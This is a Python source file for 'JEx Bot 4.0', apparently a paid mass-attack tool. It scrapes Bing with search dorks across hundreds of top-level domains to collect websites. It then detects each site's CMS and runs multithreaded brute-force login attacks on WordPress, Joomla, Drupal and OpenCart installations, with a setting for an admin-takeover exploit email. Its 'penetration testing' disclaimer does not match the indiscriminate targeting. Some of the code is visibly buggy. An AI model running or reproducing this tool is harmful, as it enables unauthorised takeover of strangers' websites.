# coding=utf-8
# [it's work only in python2.7]
# --------------------------------
YOUR_Email_For_TAkeAdmin_Exploit = 'pingtesterbeh1337@gmail.com'  # Edit this line with your email Address
r = '\033[31m'
g = '\033[32m'  # JEx Bot Version 4.0 [2/24/2020]
y = '\033[33m'  # Note! : We don't Accept any responsibility for any illegal usage.
b = '\033[34m'  # This tool is for Penetration Testing
m = '\033[35m'  #
c = '\033[36m'  # if you don't buy this script please buy Then use.
w = '\033[37m'  # [t.me/JEXShop]
# --------------------------------

VERSION = 'JEx Bot [4.0]'

# ----------------------------------------
from Tools import cms
import sys, os, threading, time, re
from multiprocessing import Pool

try:
    from bs4 import BeautifulSoup
except ImportError:
    print('---------------------------------------------------')
    print('[*] pip install bs4')
    print('   [-] you need to install bs4 Module')
    sys.exit()

try:
    import requests
except ImportError:
    print('---------------------------------------------------')
    print('[*] pip install requests')
    print('   [-] you need to install requests Module')
    sys.exit()

try:
    os.mkdir('result')
except:
    pass
try:
    os.mkdir('cms')
except:
    pass


# ------------Wordpress-------------
from BruteForce import Wordpress
# -------------Joomla---------------
from BruteForce import  Joomla
# --------------Drupal---------------
from BruteForce import Drupal
# -------------opencart--------------
from BruteForce import Opencart

def clear():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])


def Banner():
    bb = open('files/banner.txt', 'r').read()
    print(bb.format(r, g, r, w, r, y, w, g, r, y, g, g))

def options():
    option = '''
    {}USAGE {}
      [{}python JExBruteforce.py {}list.txt{}
       try Mix CMS or Wordpress Only{}{}{}]
    '''.format(r, w, c, g, c, g, c, w)
    print(option)

# --------------------------------------- Multi Scan -----------------------------------------------

def Rez(site, i):
    try:
        if 'YES' in str(i):
            print(' {}+ {}{} {}--> {}{} {}YES!{}'.format(g, w, site, c, y, i[2], g, w))
        else:
            print(' {}- {}{} {}--> {}{} {}NO!{}'.format(r, w, site, c, y, i[2], r, w))
    except:
        print(' {}- {}{} {}--> {}{} {}NO!{}'.format(r, w, site, c, y, i[2], r, w))

def MultiThreadScan(site):
    try:
        if site.startswith('http://'):
            site = site.replace('http://', '')
        elif site.startswith("https://"):
            site = site.replace('https://', '')
        else:
            pass
        Check_CMs = cms.DetectCMS(site)
        if Check_CMs == 'wordpress':
            mkobj = Wordpress.Wordpress()
            i = mkobj.Run(site)
            Rez(site, i)
        elif Check_CMs == 'joomla':
            mkobj = Joomla.JooMLaBruteForce()
            i = mkobj.Run(site)
            Rez(site, i)
        elif Check_CMs == 'drupal':
            mkobj = Drupal.DrupalBruteForce()
            i = mkobj.Run(site)
            Rez(site, i)
        elif Check_CMs == 'opencart':
            mkobj = Opencart.OpenCart()
            Rez(site, i)
        elif Check_CMs == 'unknown':
            Rez(site, i)
        elif Check_CMs == 'deadTarget':
            print(' {}- {}{} {}--> {} Timeout!{}'.format(r, w, site, c, y, w))
    except:
        print(' {}- {}{} {}--> {} Crashed!{}'.format(r, w, site, c, y, w))
# ------------------------------------------------------------------
domains = [
    'ac', 'ad', 'ae', 'af', 'ag', 'ai', 'al', 'am', 'an', 'ao',
    'aq', 'ar', 'as', 'at', 'au', 'aw', 'ax', 'az', 'ba', 'bb',
    'bd', 'be', 'bf', 'bg', 'bh', 'bi', 'bj', 'bm', 'bn', 'bo',
    'br', 'bs', 'bt', 'bv', 'bw', 'by', 'bz', 'ca', 'cc', 'cd',
    'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co', 'cr',
    'cu', 'cv', 'cx', 'cy', 'cz', 'de', 'dj', 'dk', 'dm', 'do',
    'dz', 'ec', 'ee', 'eg', 'eh', 'er', 'es', 'et', 'eu', 'fi',
    'fj', 'fk', 'fm', 'fo', 'fr', 'ga', 'gb', 'gd', 'ge', 'gf',
    'gg', 'gh', 'gi', 'gl', 'gm', 'gn', 'gp', 'gq', 'gr', 'gs',
    'gt', 'gu', 'gw', 'gy', 'hk', 'hm', 'hn', 'hr', 'ht', 'hu',
    'id', 'ie', 'il', 'im', 'in', 'io', 'iq', 'is', 'it', 'com'
    'je', 'jm', 'jo', 'jp', 'ke', 'kg', 'kh', 'ki', 'km', 'kn',
    'kp', 'kr', 'kw', 'ky', 'kz', 'la', 'lb', 'lc', 'li', 'lk',
    'lr', 'ls', 'lt', 'lu', 'lv', 'ly', 'ma', 'mc', 'md', 'me',
    'mg', 'mh', 'mk', 'ml', 'mm', 'mn', 'mo', 'mp', 'mq', 'mr',
    'ms', 'mt', 'mu', 'mv', 'mw', 'mx', 'my', 'mz', 'na', 'nc',
    'ne', 'nf', 'ng', 'ni', 'nl', 'no', 'np', 'nr', 'nu', 'nz',
    'om', 'pa', 'pe', 'pf', 'pg', 'ph', 'pk', 'pl', 'pm', 'pn',
    'pr', 'ps', 'pt', 'pw', 'py', 'qa', 're', 'ro', 'rs', 'ru',
    'rw', 'sa', 'sb', 'sc', 'sd', 'se', 'sg', 'sh', 'si', 'sj',
    'sk', 'sl', 'sm', 'sn', 'so', 'sr', 'st', 'su', 'sv', 'sy',
    'sz', 'tc', 'td', 'tf', 'tg', 'th', 'tj', 'tk', 'tl', 'tm',
    'tn', 'to', 'tp', 'tr', 'tt', 'tv', 'tw', 'tz', 'ua', 'ug',
    'uk', 'um', 'us', 'uy', 'uz', 'va', 'vc', 've', 'vg', 'vi',
    'vn', 'vu', 'wf', 'ws', 'ye', 'yt', 'za', 'zm', 'zw', 'pro',
    'net', 'org', 'biz', 'gov', 'mil', 'edu', 'info', 'int', 'tel',
    'name', 'aero', 'asia', 'cat', 'coop', 'jobs', 'mobi', 'museum', 'travel'
]
# --------------------------------
Headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 4.2.2; QMV7A Build/JDQ39) AppleWebKit/537.36'
                  ' (KHTML, like Gecko) Chrome/39.0.2171.59 Safari/537.36'
}

urls = []
ProxyDAta = []


def CheckProxy(proxy):
    print('TEsting {}'.format(proxy))
    proxy = {'http': proxy,
             'https': proxy}
    try:
        Check = requests.get('http://www.bing.com/?toWww=1', timeout=3, proxies=proxy, headers=Headers)
        print(Check.status_code)
        if 'making it faster and easier to go from searching to doing.' in str(Check.content):
            ProxyDAta.append(proxy)
            print(proxy)
    except:
        pass

def BingDorker(Dork, domain, Num):
    try:
        url = 'http://www.bing.com/search?q=' + Dork + ' site:' + domain + '&first=' + str(
            Num) + '&FORM=PORE'
        cnn = requests.get(url, timeout=5, headers=Headers)
        try:
            finder = re.findall('<h2><a href="((?:https://|http://)[a-zA-Z0-9-_]+\.*[a-zA-Z0-9]'
                                '[a-zA-Z0-9-_]+\.[a-zA-Z]{2,11})', str(cnn.content))
            for u in finder:
                if u.startswith('http://'):
                    u = u.replace('http://', '')
                elif u.startswith('https://'):
                    u = u.replace('https://', '')
                if u.startswith('www.'):
                    u = u.replace('www.', '')
                if 'go.microsoft.com' in u:
                    pass
                elif '.wordpress.' in u:
                    pass
                elif '.blogspot.' in u:
                    pass
                else:
                    urls.append(u)
        except:
            pass
    except:
        BingDorker(Dork, domain, Num)

def GoDorking(Dork, dom):
    thread = []
    pages = []
    i = 0
    while i <= 500:
        pages.append(str(i))
        i += 10
    for page in pages:
        try:
            t = threading.Thread(target=BingDorker, args=(Dork, dom, page))
            t.start()
            thread.append(t)
            time.sleep(0.6)
        except:
            pass
    for j in thread:
        j.join()

def STarTDorking(Dork):
    thread = []
    for domain in domains:
        try:
            print(' -Grabbed Sites: {}'.format(len(urls)))
            t = threading.Thread(target=GoDorking, args=(Dork, domain))
            t.start()
            thread.append(t)
            time.sleep(0.6)
        except:
            pass
    for j in thread:
        j.join()


if __name__ == '__main__':
    clear()
    try:
        Target = sys.argv[1]
        try:
            x = open(Target, 'r').read().splitlines()
            TEXTList = open(Target, 'r').read().splitlines()
            p = Pool(30)
            p.map(MultiThreadScan, TEXTList)
        except:
            try:
                qs = raw_input(' -Do You want Start Scanning With [{}] dork(y/n)? '.format(sys.argv[1]))
            except:
                qs = input(' -Do You want Start Scanning With [{}] dork(y/n)? '.format(sys.argv[1]))
            if qs == 'y' or qs == 'Y' or qs == 'Yes' or qs == 'YES':
                STarTDorking(sys.argv[1])
                p = Pool(30)
                p.map(MultiThreadScan, urls)
            else:
                print(' [+] Scanning Stoped...!')
    except:
        clear()
        Banner()
        options()
        sys.exit()

